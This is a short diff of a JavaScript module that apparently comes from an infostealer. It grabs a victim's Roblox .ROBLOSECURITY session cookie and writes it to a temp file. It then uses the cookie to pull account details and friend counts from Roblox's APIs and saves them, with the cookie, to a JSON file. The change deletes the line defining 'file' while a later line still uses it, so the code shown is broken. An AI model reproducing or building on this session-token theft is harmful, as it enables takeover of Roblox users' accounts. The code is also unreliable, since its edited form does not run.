@@ -13,13 +13,12 @@ module.exports = async () => {
   const { value: cookie, source } = cookieValue;
   fs.writeFileSync(join(getTempFolder(), 'Roblox Cookie.txt'), cookie);
 
-  const file = await searchForFile(join(getTempFolder(), 'Roblox Cookie.txt'), 100, 10);
   const jsonFile = join(getTempFolder(), 'Roblox.json');
   const config = { headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') } };
   const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
   const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
   account.data.source = source;
-  account.data.cookie = cookieValue || file.replaceAll('"', '');
+  account.data.cookie = cookie;
   account.data.friendsCount = friendsCount.data.count;
   writeFileSync(jsonFile, JSON.stringify(account.data));
 };
